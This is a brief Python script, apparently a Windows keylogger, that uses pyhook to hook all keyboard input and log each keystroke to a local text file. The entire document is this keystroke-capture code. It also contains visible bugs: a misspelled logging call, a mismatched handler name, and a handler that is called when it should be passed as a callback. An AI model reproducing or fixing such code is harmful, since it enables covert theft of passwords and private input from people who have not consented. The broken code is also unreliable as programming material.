import pyhook, pythoncom, sys, logging

file_log = 'C:\\important\\log.txt'

def onKeyboardEvent(event):
	logging.basciConfig(filename=file_log, level=logging.DEBUG, format='%(message)s')
	chr(event.Ascii)
	logging.log(10, chr(event.Ascii))
	return True

hooks_manager = pyhook.HookManager()
hooks_manager.keyDown = OnKeyboardEvent()
hooks_manager.HookKeyboard()
pythoncom.PumpMessages()